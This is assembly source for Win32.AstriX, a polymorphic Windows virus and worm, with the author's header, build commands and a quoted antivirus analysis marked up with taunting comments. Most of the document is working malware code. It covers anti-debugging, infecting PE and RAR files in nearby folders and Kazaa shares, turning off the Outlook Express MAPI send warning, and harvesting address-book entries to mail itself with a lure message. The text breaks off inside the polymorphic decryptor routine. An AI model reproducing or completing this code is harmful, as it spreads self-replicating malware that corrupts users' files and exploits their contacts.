comment ~

[Information]

	Virus Name:Win32.AstriX
	Virus Author:DR-EF
	Virus Size:8k
	Target:PE file:exe\scr & rar archives
	Features:
		o Encrypted
		o Polymorphic
		o AntiDebugging
		o P2P Worm
		o MAIL Worm(using mapi)
	Payload:MessageBox & Change windows titles
		every year at 29/12

[Description]

Here is a virus description from Computer Associates:
(http://www3.ca.com/threatinfo/virusinfo/virus.aspx?id=38333)

my comments are between the [* *]



Win32.Astrool.12730 [* fuck off avers ,its Win32.Astrix !!! *]
Alias: W32/Dref@MM (McAfee),
Win32/Astrool.12730  
Category: Win32  
Type: Virus, Worm 
 
 

CHARACTERISTICS:
---------------
Win32.Astrool.12730 is a polymorphic, encrypted file infecting virus, 
as well as a worm that can spread via e-mail using the Simple MAPI 
protocol.[* wow,i didnt know that there is Simple mapi protocol ? *]
It also targets files being shared by Kazaa, enabling it 
to spread via peer-to-peer file sharing.

Method of Installation:
-----------------------
Astrool.12730 does not install itself on the system directly.
As a traditional virus, it implants itself by infecting files on the system.

Method of Distribution:
-----------------------

Via File Infection:

When run, Astrool.12730 searches for and infects Windows PE executable
files in the current directory,[* and in two upper directorys ! *]
and in Kazaa shared directories. It finds these shared directories 
by reading this registry value:

HKEY_CURRENT_USER\Software\Kazaa\LocalContent\dir0

This enables it to spread through executable files shared through Kazaa.
The virus infects files with the extensions .exe and .scr. It also attempts 
to add itself to RAR archives (*.rar), if it finds any.

The virus is polymorphic, meaning every instance of the virus appears different.

Via E-mail:

Astrool.12730 sends itself via e-mail only at particular times and dates
- the minutes must be 50 or higher, the secconds 30 or lower, and the day
of the month must be the 15th or earlier. If the time matches, it then checks 
for an active Internet connection by attempting to connect to http://www.cnn.com/.

If the connection is successful, it begins its e-mail routine. First,
it sets the following registry value:

HKEY_CURRENT_USER\Identities\(Default User ID)\Software\Microsoft
\Outlook Express\5.0\Mail\Warn on Mapi Send = 0x0

Where (Default User ID) is read from the value:

HKEY_CURRENT_USER\Identities\Default User ID

This will stop Outlook Express from warning the user when another program 
attempts to send mail through it using MAPI.

Next, it finds the default Windows Address Book (WAB) file from the following
registry value:

HKEY_CURRENT_USER\Software\Microsoft\WAB\WAB4\Wab File Name

It then uses Simple MAPI commands to send itself to all addresses it finds
in the WAB file. The messages appear as follows:

Subject:
i have cooool stuff for you !

Body:
hi
take a look at whate i find in the net !
its very cool program,check it out :-)
and tell me if you like it,ok
bye

The attachment will be the file that sent the message. The file name and size 
therefore vary depending on the infected host file.

Note: In lab tests, the virus only successfully sent e-mails on systems using 
Outlook Express version 6.

Payload:
-------
If the date is 29 December, the virus displays the following message box:

Win32.Astrix Virus Coded By DR-EF All Right Reserved

It also replaces text labels in many open windows with this message:

Win32.Astrix Virus Coded By DR-EF All Right Reserved

Analysis by Hamish O'Dea
 

[How To Compile]
	
	tasm32 /m3 /ml /zi Astrix.asm , , ;
	tlink32 /tpe /aa /v astrix , astrix , ,import32.lib
	pewrsec Astrix.exe

~
.386
.model flat

		extrn 	MessageBoxA:proc	;apis for the first generation
		extrn	ExitProcess:proc
		
	virus_size	equ	End_Astrix - Astrix
	loader_size	equ	end_virus_decryptor-virus_decryptor
.data
	
		db ?
.code

Astrix:
		mov	esp,[esp + 8h]
		pop	dword ptr fs:[0]
		add	esp,4h
		call	decrypt_virus
start_ecrypt:	mov	esp,[esp + 8h]
		pop	dword ptr fs:[0]	;remove SEH
		add	esp,4h
		call	get_delta
get_delta:	pop	ebp
		sub	ebp,offset get_delta
first_g:	call	find_kernel		;first generation start here
		jnc	execute_host
		call	get_proc_addr
		mov	ecx,number_of_apis
		lea	eax,[ebp + api_strings]
		lea	ebx,[ebp + api_addresses]
		mov	edx,[ebp + kernel_base]
		call	get_apis		
		jnc	execute_host
		call	create_key
		mov	word ptr [ebp + xor_ax_key+2],ax
		call	create_key
		mov	byte ptr [ebp + xor_al_key+1],al
		mov	byte ptr [ebp + mov_cl_key+1],ah
		pushad
		xor	ebx,ebx
		lea	eax,[ebp + crash_debugger]
		push	eax
		push	dword ptr fs:[ebx]	;set SEH
		mov	fs:[ebx],esp
		mov	dword ptr [ebx],eax	;bye bye
crash_virus:	mov	ecx,(End_Astrix-crash_debugger)
crash:		inc	eax
		mov	word ptr [eax],0f0bh	;UD2 - undefined instruction
		loop	crash
		mov	ecx,(overwrite_all-Astrix)
		lea	eax,[ebp + Astrix]
overwrite_all:	inc	eax
		mov	word ptr [eax],0f0bh	;UD2 - undefined instruction
		loop	overwrite_all
crash_debugger: mov	esp,[esp + 8h]
		pop	dword ptr fs:[0]	;remove SEH
		add	esp,4h
		popad
		lea	eax,[ebp + IsDebuggerPresent_api]
		push	eax
		push	[ebp + kernel_base]
		call	[ebp + _GetProcAddress]
		cmp	eax,0h
		je	check_debugger2
		call	eax
		xchg	eax,ecx
		lea	eax,[ebp + crash_debugger]
		dec	ecx
		jcxz	crash_virus
check_debugger2:mov	ecx,fs:[20h]
		jcxz	no_debugger1
		lea	eax,[ebp + crash_debugger]
		jmp	crash_virus
no_debugger1:	call	infect_current_and_upper_directory
		call	infect_kazaa_shared_files
		call	send_virus_via_mail
		call	payload
execute_host:	popad
		db	64h,0A1h,0,0,0,0 ;mov eax,fs:[00000000]
		ret
IsDebuggerPresent_api	db	"IsDebuggerPresent",0h
payload:
		lea	eax,[ebp + SYSTEMTIME]
		push	eax
		call	[ebp + _GetLocalTime]
		;check trigger:
		cmp	[ebp + wMonth],0ch
		jne	exit_payload
		cmp	[ebp + wDay],1dh
		jne	exit_payload
		lea	eax,[ebp + user32_dll]
		push	eax
		call	[ebp + _LoadLibrary]
		cmp	eax,0h
		je	exit_payload
		push	eax	;save module handle
		xchg	ebx,eax
		lea	eax,[ebp + SetWindowTextA]
		push	eax
		push	ebx
		call	[ebp + _GetProcAddress]
		cmp	eax,0h
		je	exit_payload
		mov	[ebp + SetWindowText],eax
		mov	ecx,0ffffh
pay_load:	push	ecx
		lea	eax,[ebp + copyright]
		push	eax
		push	ecx
		call	[ebp + SetWindowText]
		pop	ecx
		loop	pay_load
		lea	eax,[ebp + MessageBoxA2]
		pop	ebx
		push	eax
		push	ebx
		call	[ebp + _GetProcAddress]
		cmp	eax,0h
		je	exit_payload
		lea	ebx,[ebp + copyright]
		push	MB_ICONINFORMATION or MB_SYSTEMMODAL
		push	ebx
		push	ebx
		push	0
		call	eax
exit_payload:	ret
		user32_dll	db	"User32.dll",0
		SetWindowTextA	db	"SetWindowTextA",0
		MessageBoxA2	db	"MessageBoxA",0
		SetWindowText	dd	0
		MB_SYSTEMMODAL	equ	00001000h
		MB_ICONINFORMATION	equ	00000040h
	SYSTEMTIME:
		wYear	dw	0
		wMonth	dw	0
		wDayOfWeek	dw	0
		wDay	dw	0
		wHour	dw	0
		wMinute	dw	0
		wSecond	dw	0
		wMilliseconds	dw	0
		
create_key:	
		call	[ebp + _GetTickCount]
		mov	[ebp + rndnm],eax
rnd_num:  	mov	cx,ax			;this code is useless,but i didnt
  		ror	eax,cl			;remove it when i relese it,because
  		mov	cl,al			;i didnt had time to change my code.
  		dec	ecx
  		mul	cx
  		shr	eax,1h
  		add	eax,2h
		ret
random_number:
		mov	eax,[ebp + rndnm]
		call	rnd_num
		xchg	eax,ecx
		call	[ebp + _GetTickCount]
		add	eax,ecx
		mov	[ebp + rndnm],eax
		ret
		rndnm	dd	0h

infect_kazaa_shared_files:
		;set SEH:
		pushad
		lea	eax,[ebp + kazaa_error_handle]
		push	eax
		xor	eax,eax
		push	dword ptr fs:[eax]
		mov	fs:[0],esp	
		lea	eax,[ebp + advapi32_dll]
		push	eax
		call	[ebp + _LoadLibrary]
		cmp	eax,0h
		je	mail_err
		mov	edx,eax
		mov	ecx,4h
		lea	eax,[ebp + reg_funcs]
		lea	ebx,[ebp + reg_funcs_add]
		call	get_apis
		jnc	kazaa_error
		lea	eax,[ebp + hkey]
		push	eax
		push	KEY_QUERY_VALUE
		push	0h
		lea	eax,[ebp + dirs_location]
		push	eax
		push	HKEY_CURRENT_USER
		call	[ebp + _RegOpenKeyEx]
		cmp	eax,0h
		jne	kazaa_error
next_kazaa_dir:	mov	[ebp + val_s],000000ffh
		mov	[ebp + val],0h
		mov	[ebp + val_type],0h
		lea	eax,[ebp + val_s]
		push	eax
		lea	eax,[ebp + val]
		push	eax
		lea	eax,[ebp + val_type]
		push	eax
		push	0h
		lea	eax,[ebp + dir_n]
		push	eax
		push	[ebp + hkey]
		call	[ebp + _RegQueryValueEx]
		cmp	eax,0h
		jne	kazaa_close_key
		lea	eax,[ebp + val]
		add	eax,7h
		call	infect_directory
		lea	eax,[ebp + dir_n]
		add	eax,3h
		inc	byte ptr [eax]
		cmp	byte ptr [eax],3ah
		jne	next_kazaa_dir
kazaa_close_key:
		push	[ebp + hkey]
		call	[ebp + _RegCloseKey]
kazaa_error:
		;remove SEH
		pop	dword ptr fs:[0]
		add	esp,4h
		popad
		ret
kazaa_error_handle:
		mov	esp,[esp + 8h]
		pop	dword ptr fs:[0]
		add	esp,4h
		popad
		ret
		dirs_location	db	"Software\Kazaa\LocalContent",0
		dir_n	db	"dir",30h,0h
		val_s	dd	0ffh
		val	db	0ffh dup(0)
		val_type	dd 0h

send_virus_via_mail:
;check some conditions before sending mails:
		lea	eax,[ebp + SYSTEMTIME]
		push	eax
		call	[ebp + _GetLocalTime]
		cmp	[ebp + wMinute],32h
		jb	mail_err
		cmp	[ebp + wDay],0fh
		ja	mail_err
		cmp	[ebp + wSecond],1eh
		ja	mail_err
		lea	eax,[ebp + advapi32_dll]
		push	eax
		call	[ebp + _LoadLibrary]
		cmp	eax,0h
		je	mail_err
		mov	edx,eax
		mov	ecx,4h
		lea	eax,[ebp + reg_funcs]
		lea	ebx,[ebp + reg_funcs_add]
		call	get_apis
		jnc	mail_err
;check if there is active internet connection:
		lea	eax,[ebp + wininet_dll]
		push	eax
		call	[ebp + _LoadLibrary]
		cmp	eax,0h
		je	mail_err
		xchg	eax,ebx
		lea	eax,[ebp + InternetCheckConnection]
		push	eax
		push	ebx
		call	[ebp + _GetProcAddress]
		cmp	eax,0h
		je	mail_err
		xchg	eax,ecx
		push	0h
		push	FLAG_ICC_FORCE_CONNECTION
		lea	eax,[ebp + site_to_check]
		push	eax
		call	ecx
		cmp	eax,0h
		je	mail_err
		mov	eax,fs:[20h]	;do something nice.
		cmp	eax,0h
		je	no_debugger2
		lea	eax,[ebp + crash_debugger]
		jmp	crash_virus
;disable outlook express virus protection:
no_debugger2:	lea	eax,[ebp + hkey]
		push	eax
		push	0h
		push	KEY_QUERY_VALUE
		lea	eax,[ebp + key_name]
		push	eax
		push	HKEY_CURRENT_USER
		call	[ebp + _RegOpenKeyEx]
		cmp	eax,0h
		jne	search_mails
		lea	eax,[ebp + id_size]
		push	eax
		lea	eax,[ebp + user_id]
		push	eax
		xor	eax,eax
		push	eax
		push	eax
		lea	eax,[ebp + id]
		push	eax
		push	[ebp + hkey]
		call	[ebp + _RegQueryValueEx]
		cmp	eax,0h
		jne	close_p_keys
		lea	eax,[ebp + hkey2]
		push	eax
		push	KEY_WRITE
		push	0h
		lea	eax,[ebp + user_id]
		push	eax
		push	[ebp + hkey]
		call	[ebp + _RegOpenKeyEx]
		cmp	eax,0h
		jne	close_p_keys
		push	[ebp + hkey]
		call	[ebp + _RegCloseKey]
		lea	eax,[ebp + hkey]
		push	eax
		push	KEY_WRITE
		push	0h
		lea	eax,[ebp + mapi_k]
		push	eax
		push	[ebp + hkey2]
		call	[ebp + _RegOpenKeyEx]
		cmp	eax,0h
		jne	close_p_keys
		push	4h	;dd
		lea	eax,[ebp + protection_off]
		push	eax
		push	REG_DWORD
		push	0h
		lea	eax,[ebp + mapi_virus_p]
		push	eax
		push	[ebp + hkey]
		call	[ebp + _RegSetValueExA]
close_p_keys:	push	[ebp + hkey]
		call	[ebp + _RegCloseKey]
		push	[ebp + hkey2]
		call	[ebp + _RegCloseKey]
;search emails:
search_mails:
		lea	eax,[ebp + hkey]
		push	eax
		xor	eax,eax
		push	eax
		push	eax
		lea	eax,[ebp + wab_location]
		push	eax
		push	HKEY_CURRENT_USER
		call	[ebp + _RegOpenKeyEx]
		cmp	eax,0h
		jne	mail_err
		lea	eax,[ebp + sizeof_wab_path]
		push	eax
		lea	eax,[ebp + wab_path]
		push	eax
		xor	eax,eax
		push	eax
		push	eax
		push	eax
		push	[ebp + hkey]
		call	[ebp + _RegQueryValueEx]
		cmp	eax,0h
		jne	mail_err
		push	[ebp + hkey]
		call	[ebp + _RegCloseKey]
		cmp	eax,0h
		jne	mail_err
		lea	ebx,[ebp + wab_path]
		lea	eax,[ebp + WIN32_FIND_DATA]
		push	eax
		push	ebx
		Call	[ebp + _FindFirstFile]
		cmp	eax,0h
		je	mail_err
		lea	ebx,[ebp + wab_path]
		call	open_file
		cmp	eax,INVALID_HANDLE_VALUE
		je	mail_err
		mov	[ebp + opened_file_handle],eax
		mov	eax,[ebp + nFileSizeLow]
		call	create_map
		cmp	eax,0h
		je	mail_err
		mov	[ebp + map_handle],eax
		mov	eax,[ebp + nFileSizeLow]
		call	map_view
		cmp	eax,0h
		je	mail_err
		mov	[ebp + map_base],eax
;check how much memory we need to allocate for emails:
		mov	ax,word ptr [eax + 64h]
		cmp	ax,1h
		je	unmapwab
		mov	cx,44h	;every mail allocate 68 bytes
		mul	cx
		;ax-how much memory to allocate
		xor	ebx,ebx
		mov	bx,ax
		push	ebx
		push	GPTR
		call	[ebp + _GlobalAlloc]
		cmp	eax,0h
		je	unmapwab
		mov	[ebp + allocated_memory_handle],eax
		;start to read all emails from wab file:
		xchg	eax,ebx
		xor	ecx,ecx
		mov	eax,[ebp + map_base]
		mov	cx,word ptr [eax + 64h]
		add	eax,[eax + 60h]
		mov	[ebp + number_of_mails],cx
		;eax - addresses in wab
		;ebx - allocated memory
		;cx - number of addreses
next_mail:
		push	ecx
		mov	ecx,44h
copy_mail:	cmp	byte ptr [eax],0h
		je	move_to_next_mail
		mov	dl,byte ptr [eax]
		mov	byte ptr [ebx],dl
		inc	ebx
		add	eax,2h
		dec	ecx
		loop	copy_mail
move_to_next_mail:
		add	eax,ecx
		inc	ebx
		mov	byte ptr [ebx],0h
		pop	ecx
		loop	next_mail
unmapwab:
		push	[ebp + map_base]
		call	[ebp + _UnmapViewOfFile]
		push	[ebp + map_handle]
		call	[ebp + _CloseHandle]
		push	[ebp + opened_file_handle]
		call	[ebp + _CloseHandle]
;--------------LogIn:
		lea	eax,[ebp + mapi_dll]
		push	eax
		call	[ebp + _LoadLibrary]
		cmp	eax,0h
		je	mail_err
		mov	edx,eax
		mov	ecx,3h
		lea	eax,[ebp + mapi_funcs]
		lea	ebx,[ebp + mapi_func_add]		
		call	get_apis
		jnc	free_mails_mem
		lea	eax,[ebp + mapi_session_handle]
		push	eax
		xor	eax,eax
		push	eax
		push	eax
		push	MAPI_NEW_SESSION
		push	eax
		push	eax
		call	[ebp + _MAPILogon]
		cmp	eax,0h
		jne	mail_err
;-----------Get The Infected FileName:
		push	0ffh
		lea	eax,[ebp + infected_file]
		push	eax
		push	0h
		call	[ebp + _GetModuleFileName]
		cmp	eax,0h
		je	log_off
;----------SendMail:
		xor	ecx,ecx
		mov	cx,[ebp + number_of_mails]
		inc	cx
		mov	ebx,[ebp + allocated_memory_handle]
send_next_mail:
		dec	ecx
		push	ecx
		lea	eax,[ebp + subject]
		mov	[ebp + lpszSubject],eax
		lea	eax,[ebp + message]
		mov	[ebp + lpszNoteText],eax
		lea	eax,[ebp + MapiRecipDesc2]
		mov	[ebp + lpOriginator],eax
		lea	eax,[ebp + MapiRecipDesc]
		mov	[ebp + lpRecips],eax
		lea	eax,[ebp + MapiFileDesc]
		mov	[ebp + lpFiles],eax
		;set the recipient:
		mov	[ebp + lpszName],ebx	; address from the allocated memory
		mov	[ebp + lpszAddress],ebx
		;set the attachment structure:
		lea	eax,[ebp + infected_file]
		mov	[ebp + lpszPathName],eax
		;send the mail:
		push	0h
		push	MAPI_NEW_SESSION
		lea	eax,[ebp + offset MapiMessage]
		push	eax
		xor	eax,eax
		push	eax
		push	eax
		call	[ebp + _MAPISendMail]
		pop	ecx
		cmp	eax,0h
		jne	log_off
next_address:
		inc	ebx
		cmp	byte ptr [ebx],0h
		jne	next_address
		inc	ebx
		cmp	cx,0h
		jne	send_next_mail
;----------LogOff
log_off:
		xor	eax,eax
		push	eax
		push	eax
		push	eax
		push	[ebp + mapi_session_handle]
		call	[ebp + _MAPILogoff]
;----------FreeMemory:
free_mails_mem:	push	[ebp + allocated_memory_handle]
		call	[ebp + _GlobalFree]
mail_err:
		ret
		InternetCheckConnection	db	"InternetCheckConnectionA",0
		wininet_dll	db	"Wininet.dll",0
		site_to_check	db	"http://www.cnn.com/",0
		FLAG_ICC_FORCE_CONNECTION	equ	00000001h
		;outlook express protection:
		hkey2	dd	0h
		key_name	db	"Identities",0h
		id	db	"Default User ID",0h
		user_id	db 64h	dup(0h)
		id_size	dd	64h
		id_type	dd	0h
		mapi_virus_p	db	"Warn on Mapi Send",0
		mapi_k	db	"Software\Microsoft\Outlook Express\5.0\Mail",0
		protection_off	dd	0h
		;mapi data:
		MAPI_NEW_SESSION	equ	00000002h
		mapi_dll	db	"mapi32.dll",0
mapi_funcs:	MAPILogon	db	"MAPILogon",0
		MAPILogoff	db	"MAPILogoff",0
		MAPISendMail	db	"MAPISendMail",0
mapi_func_add:	_MAPILogon	dd	0
		_MAPILogoff	dd	0
		_MAPISendMail	dd	0
		mapi_session_handle	dd	0
		wab_location	db	"Software\Microsoft\WAB\WAB4\Wab File Name",0
		wab_path	db	0ffh	dup(0)
		sizeof_wab_path	dd	0ffh
		number_of_mails	dw	0
		subject	db	"i have cooool stuff for you !",0
		message	db	"hi",0dh,0ah,"take a look at whate i find in the net !",0dh,0ah,"its very cool program,check it out :-)",0dh,0ah,"and tell me if you like it,ok",0dh,0ah,"bye",0
		;MapiMessage Structure:
		MapiMessage:
		ulReserved	dd	0
		lpszSubject	dd	0
		lpszNoteText	dd	0
		lpszMessageType	dd	0
		lpszDateReceived	dd	0
		lpszConversationID	dd	0
		flFlags1	dd	0
		lpOriginator	dd	0
		nRecipCount	dd	1h
		lpRecips	dd	0
		nFileCount	dd	1h
		lpFiles	dd	0
		;MapiFileDesc Structure:
		MapiFileDesc:
		ulReserved2	dd	0
		flFlags2	dd	0
		nPosition	dd	0
		lpszPathName	dd	0	;infected file
		lpszFileName	dd	0
		lpFileType	dd	0
		;MapiRecipDesc Structure:
		MapiRecipDesc:
		ulReserved3	dd	0
		ulRecipClass	dd	1
		lpszName	dd	0
		lpszAddress	dd	0
		ulEIDSize	dd	0
		lpEntryID	dd	0
		MapiRecipDesc2:
		ulReserved4	dd	0
		ulRecipClass2	dd	0
		lpszName2	dd	0
		lpszAddress2	dd	0
		ulEIDSize2	dd	0
		lpEntryID2	dd	0

infect_current_and_upper_directory:
		mov	eax,fs:[20h]
		cmp	eax,0h
		je	no_debugger
		xor	esp,esp		;fuck up debugger !
no_debugger:	mov	[ebp + infection_counter],0h
		mov	[ebp + directory_level],0h
		lea	eax,[ebp + cur_dir]
		push	eax
		push	max_path
		call	[ebp + _GetCurrentDirectory]
		cmp	eax,max_path
		ja	buffer_not_good
		lea	eax,[ebp + Current_Directory]
		push	eax
		push	max_path
		call	[ebp + _GetCurrentDirectory]
		cmp	eax,max_path
		ja	buffer_not_good
		mov	[ebp + directory_name_size],eax
		lea	eax,[ebp + Current_Directory]
		call	infect_directory
up_dir:		lea	ebx,[ebp + Current_Directory]
		mov	eax,[ebp + directory_name_size]
		add	ebx,eax
		inc	ebx
up_search:	cmp	byte ptr [ebx],'\'
		je	end_search
		mov	byte ptr [ebx],0h
		dec	ebx
		jmp	up_search
end_search:
		mov	byte ptr [ebx],0h
		dec	ebx
		cmp	byte ptr [ebx],':'	;we are in the root ?
		je	restore_cur_dir
		lea	eax,[ebp + Current_Directory]
		call	infect_directory
		cmp	[ebp + directory_level],2h	;infect 2 uppers directorys
		jbe	up_dir
restore_cur_dir:
		lea	eax,[ebp + cur_dir]
		push	eax
		call	[ebp + _SetCurrentDirectory]
buffer_not_good:
		ret
		directory_level	db	0h
		cur_dir	db	max_path	dup(0)
infect_directory:
		;eax - pointer to directory name
		push	eax
		call	[ebp + _SetCurrentDirectory]
		cmp	eax,0h
		je	search_error
		lea	eax,[ebp + WIN32_FIND_DATA]
		push	eax
		lea	eax,[ebp + search_mask]
		push	eax
		call	[ebp + _FindFirstFile]
		cmp	eax,INVALID_HANDLE_VALUE
		je	search_error
		mov	[ebp + file_handle],eax
next_file:
		cmp	[ebp + infection_counter],6h
		jae	search_error
		lea	eax,[ebp + cFileName]
@@1:		cmp	byte ptr [eax],0h
		je	check_ex
		cmp	byte ptr [eax],'v' ;dont infect files with 'v' in they name
		je	_unknow
		inc	eax
		jmp	@@1
check_ex:	
		sub	eax,4h
		cmp	dword ptr [eax],"exe."
		je	pe_file
		cmp	dword ptr [eax],"EXE."
		je	pe_file
		cmp	dword ptr [eax],"RCS."
		je	pe_file
		cmp	dword ptr [eax],"rcs."
		je	pe_file
		cmp	dword ptr [eax],"rar."
		je	rar_file
		cmp	dword ptr [eax],"RAR."
		je	rar_file
		jmp	_unknow
rar_file:	call	infect_rar
		jmp	_unknow
pe_file:	call	infect_pe
_unknow:	lea	eax,[ebp + WIN32_FIND_DATA]
		push	eax
		push	[ebp + file_handle]
		call	[ebp + _FindNextFile]
		cmp	eax,0
		jne	next_file
search_error:
		inc	[ebp + directory_level]
		ret
infect_pe:
		mov	eax,[ebp + nFileSizeLow]
		call	pad_size
		cmp	edx,0h
		je	error_1
		mov	ebx,[ebp + dwFileAttributes]
		mov	[ebp + file_old_attributes],ebx
		lea	ebx,[ebp + cFileName]
		push	FILE_ATTRIBUTE_NORMAL
		push	ebx
		call	[ebp + _SetFileAttributes]
		cmp	eax,0h
		je	error_1
		;do not infect files that are smaller than 10kb
		cmp	[ebp + nFileSizeLow],2800h
		jb	error
		;do not infect files that are bigger than 3mb
		cmp	[ebp + nFileSizeLow],300000h
		ja	error
		call	open_file
		cmp	eax,INVALID_HANDLE_VALUE
		je	error
		mov	[ebp + opened_file_handle],eax
		lea	eax,[ebp + last_write_time]
		push	eax
		lea	eax,[ebp + last_access_time]
		push	eax
		lea	eax,[ebp + creation_time]
		push	eax
		push	[ebp + opened_file_handle]
		call	[ebp + _GetFileTime]
		mov	eax,[ebp + nFileSizeLow]
		add	eax,virus_size ;eax=host size + virus size
		call	pad_size
		push	eax
		call	create_map
		cmp	eax,0h
		je	error_close_file
		mov	[ebp + map_handle],eax
		pop	eax
		call	map_view
		cmp	eax,0h
		je	error_close_map
		mov	[ebp + map_base],eax
		;set SEH:
		pushad
		lea	ebx,[ebp + _infection_error_handle]
		push	ebx
		xor	ebx,ebx
		push	dword ptr fs:[ebx]
		mov	fs:[ebx],esp
		cmp	word ptr [eax],"ZM"	;check MZ sign
		jne	cant_infect
		add	eax,[eax + 3ch]
		cmp	word ptr [eax],"EP"	;check PE sign
		jne	cant_infect
		mov	bx,word ptr [eax + 06h]
		mov	[ebp + number_of_sections],bx ;save number of sections
		mov	ebx,[eax + 74h]
		mov	[ebp + number_directories_entries],ebx
		mov	ebx,eax
		add	ebx,18h	;ebx = pe optional header
		mov	ecx,[ebx + 24h]	;ecx=file alignment
		mov	[ebp + file_alignment],ecx
		;infect only files that have file alignment of 200h or 1000h
		cmp	ecx,200h
		jne	check_1000h
		jmp	file_alignment_ok
check_1000h:
		cmp	ecx,1000h
		jne	cant_infect
file_alignment_ok:
		mov	ecx,[ebx + 1ch]	;ecx=image_base
		mov	[ebp + host_image_base],ecx
		;ok we got all information that we need from the pe optional header
		;lets find the code section:
		push	eax
		push	ebx
		mov	ecx,[ebp + number_directories_entries]
		shl	ecx,3h	; 2^3=8(directory size)
		mov	ebx,eax	;ebx point to pe header
		add	ebx,78h	;ebx=pe header + optional pe header
		add	ebx,ecx	;ebx=first section header
		xor	ecx,ecx
		mov	cx,word ptr [eax + 6h]	; cx=number of sections
next_section:	cmp	dword ptr [ebx],"xet."	; .text ?
		je	found_code_section
		cmp	dword ptr [ebx],"doc."	; .code ?
		je	found_code_section
		cmp	dword ptr [ebx],"EDOC"	; CODE ?
		je	found_code_section
		add	ebx,28h
		loop	next_section
		jmp	canot_infect_file
found_code_section:
		;check if section has code attributes:
		mov	eax,[ebx + 24h]
		and	al,20h
		cmp	al,0h
		je	canot_infect_file
		;lets check if we have room to put virus loader
		mov	eax,dword ptr [ebx + 8h]
		mov	ecx,dword ptr [ebx + 10h]
		cmp	ecx,64h	;minimum size of code section
		jb	canot_infect_file
		sub	ecx,eax
		cmp	ecx,(loader_size*2)
		jb	canot_infect_file
		;save size of free space:
		sub	ecx,loader_size
		shr	ecx,1h
		mov	[ebp + free_space],ecx
		;ebx = code section
		;let's save the address where the loader will be writen
		mov	eax,[ebp + map_base]	;start of the file !
		mov	ecx,[ebx + 14h]	;pointer to section raw data
		add	ecx,eax
		add	ecx,[ebx + 8h ] ;virtual size
		mov	[ebp + where_to_write_decryptor],ecx
		;search for mov eax,fs:[00000000] in the code section
		;and replace it with call virus_decryptor
		pushad
		push	eax	;image base of the file in the memory
		add	eax,[eax + 3ch]	;eax - pointer to pe header
		add	eax,28h	;eax - point to the entry point
		mov	eax,[eax]
		pop	ebx
		add	eax,ebx	;eax -entry point va
		cmp	[ebp + file_alignment],200h
		jne	start_search
		sub	eax,0c00h	;fix bug
start_search:	mov	edx,64h	;we search the first 100 bytes after the entry point
next_search:	cmp	word ptr [eax],0A164h
		jne	move_to_next	;move to next 4 bytes
		cmp	dword ptr [eax + 2h],00000000 ;more op code
		je	mov_eax_fs_0_found
move_to_next:	dec	edx
		cmp	edx,0h
		je	remove_mem_and_unmap
		inc	eax
		jmp	next_search
remove_mem_and_unmap:
		popad
		jmp	canot_infect_file
mov_eax_fs_0_found:
		;eax - pointer to mov eax,fs:[00000000]
		;replace mov eax,fs:[00000000] with call virus_decryptor
		mov	edx,[ebp + where_to_write_decryptor]
		push	eax
		sub	edx,eax
		sub	edx,5h
		pop	ebx
		push	edx
		call	[ebp + _GetTickCount]
		cmp	al,7fh
		ja	epo2
		call	_get_byte
		mov	byte ptr [ebx],al
		mov	byte ptr [ebx + 1h],0e8h
		pop	edx
		dec	edx
		mov	dword ptr [ebx + 2h],edx
		jmp	epo_ok
epo2:		mov	byte ptr [ebx],0e8h
		pop	edx
		mov	dword ptr [ebx + 1h],edx
		call	_get_byte
		mov	byte ptr [ebx + 5h],al
epo_ok:		popad
		;lets update the virtual size in the code section
		mov	ecx,[ebx + 8h]
		add	ecx,loader_size
		add	ecx,[ebp + free_space]
		mov	[ebx + 8h],ecx
		pop	ebx
		pop	eax
		;lets add virus code to the end of the last section
		mov	ecx,[ebp + number_directories_entries]
		shl	ecx,3h	; 2^3=8(directory size)
		mov	ebx,eax	;ebx point to pe header
		add	ebx,78h	;ebx=pe header + optional pe header
		add	ebx,ecx	;ebx=first section header
		push	eax	;save eax(eax point to pe header)
		xor	eax,eax
		xor	ecx,ecx
		mov	ax,[ebp + number_of_sections]
		dec	ax
		mov	cx,28h
		mul	cx	;eax=number of sections-1 * size of section header
		add	ebx,eax	;ebx point now to the last section header
		pop	eax	;restore eax
		;ebx=last section header
		;eax=pe header
		push	ebx
		mov	[ebp + last_section],ebx
		add	ebx,8h	;[ebx]=virtual size
		mov	ecx,[ebx]
		add	ecx,virus_size	;ecx=size of virus + virtual size
		mov	[ebx],ecx	;set new VirtualSize
		xor	edx,edx
		push	eax	;save eax
		xchg	ecx,eax
		mov	ecx,[ebp + file_alignment]
		div	cx
		sub	ecx,edx
		mov	eax,[ebx]	;eax=virtual size
		add	eax,ecx
		mov	ebx,[ebp + last_section]
		add	ebx,10h
		mov	[ebx],eax	;set new SizeOfRawData
		add	ebx,14h
		;set new section flags
		or	dword ptr [ebx],00000020h	;code
		or	dword ptr [ebx],40000000h	;readable
		or	dword ptr [ebx],80000000h	;writeable
		pop	eax
		pop	ebx
		;copy virus to the last section of the host
		mov	ecx,[ebp + map_base]
		add	ecx,[ebx + 08h]
		add	ecx,[ebx + 14h]
		sub	ecx,virus_size
		xchg	edi,ecx		;location to copy the virus
		push	eax
		lea	esi,[ebp + Astrix]
		push	esi
		push	edi
		push	edi
		;copy virus and encode it with 2 layers
		mov	ecx,virus_size
		rep	movsb
		pop	edi
		add	edi,(start_ecrypt-Astrix)
		mov	esi,edi
		mov	ecx,(decrypt_virus-start_ecrypt)
encrypt:	lodsb
		push	ecx
		mov	cl,byte ptr [ebp + mov_cl_key+1]
		rol	al,cl
		xor	al,byte ptr [ebp + xor_al_key+1]
		pop	ecx
		stosb
		loop	encrypt
		pop	edi
		pop	esi
		mov	esi,edi
		mov	ecx,(virus_size/2)
encrypt2:	lodsw
		rol	ah,1h
		xor	ax,word ptr [ebp + xor_ax_key+2]
		ror	ax,cl
		add	al,cl
		stosw
		loop	encrypt2
		pop	eax
		;set new entry point in the virus decryptor!:
		mov	ecx,[ebx + 0ch]
		add	ecx,[ebx + 08h]
		sub	ecx,virus_size
		add	ecx,[ebp + host_image_base]
		mov	dword ptr [ebp + mov_esi_virus_ep+1],ecx
		;create a (lame)polymorphic virus decryptor between the code section and the next section
		mov	edi,[ebp + where_to_write_decryptor]
		push	edi
		push	eax
		call	write_junk_code
		mov	byte ptr [edi],60h	;pushad
		inc	edi
		dec	[ebp + free_space]
		call	write_junk_code
		call	[ebp + _GetTickCount]
		and	eax,5ah
		cmp	al,1eh
		ja	next_ins
		mov	byte ptr [edi],68h	;push
		inc	edi
		mov	ebx,dword ptr [ebp + vl_cmd1 + 1h]
		mov	dword ptr [edi],ebx
		add	edi,4h
